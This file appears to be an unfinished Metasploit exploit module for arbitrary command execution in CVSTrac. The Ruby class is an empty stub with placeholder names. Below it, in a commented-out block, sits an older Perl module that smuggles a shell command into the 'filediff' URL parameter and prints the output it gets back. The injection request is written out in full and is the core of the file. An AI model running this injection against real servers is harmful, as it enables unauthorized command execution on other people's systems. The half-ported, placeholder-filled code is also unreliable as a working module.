require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'CVSTRAC Arbitrary Command Execution',
			'Description'    => %q{
					
			},
			'Author'         => [ '' ],
			'Version'        => '$Revision$',
			'References'     =>
				[

				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'any',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => '',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cvstrac_exec;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;

my $advanced = {
};

my $info = {
  'Name'    => 'CVSTRAC Arbitrary Command Execution',
  'Version'  => '$Revision$',
  'Authors' => [ '', ],
  'Arch'    => [ ],
  'OS'      => [ ],
  'Priv'    => 0,
  'UserOpts'  =>
    {
      'RHOST' => [1, 'DATA', 'The target address'],
      'RPORT' => [1, 'PORT', 'The target port', 80],
      'URL'   => [1, 'DATA', 'Base Url', '/'],
      'FILE'  => [1, 'DATA', 'File', 'CVSROOT/rcsinfo'],
    },
  'Payload' =>
    {
      'Space'     => 500,
      'Keys'      => ['cmd'],
    },
  'Description'  => Pex::Text::Freeform(qq{
    }),
  'Refs' => [ ],
  'Keys' => ['broken'],
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

  return($self);
}

sub Exploit {
  my $self = shift;

  my $targetHost  = $self->GetVar('RHOST');
  my $targetPort  = $self->GetVar('RPORT');
  my $url         = $self->GetVar('URL');
  my $file        = $self->GetVar('FILE');
  my $encodedPayload = $self->GetVar('EncodedPayload');
  my $cmd   = $encodedPayload->RawPayload;
  $cmd = $self->urlEncode($cmd);

  my $sock = Msf::Socket::Tcp->new(
    'PeerAddr' => $targetHost,
    'PeerPort' => $targetPort,
  );
  if($sock->IsError) {
    $self->PrintLine('Error creating socket: ' . $sock->GetError);
    return;
  }

  $sock->Send("GET ${url}filediff?f=${file}&v1=1.1&v2=1.2;$cmd; HTTP/1.0\r\nHost: $targetHost\r\n\r\n");

  my $data = $sock->Recv(-1);
  $self->PrintDebugLine(3, $data);

  print "-" x 10 . "\n";
  if($data =~ /\<pre\>(.*?)\<\/pre\>/s) {
    print $1;
  }
  print "-" x 10 . "\n\n";

  return;
}

sub urlEncode {
  my $self = shift;
  my $data = shift;
  $data =~ s/ /+/g;
  $data =~ s/([^\w\+])/sprintf('%%%02x', ord($1))/ge;
  return($data);
}

1;

=end


end
end	
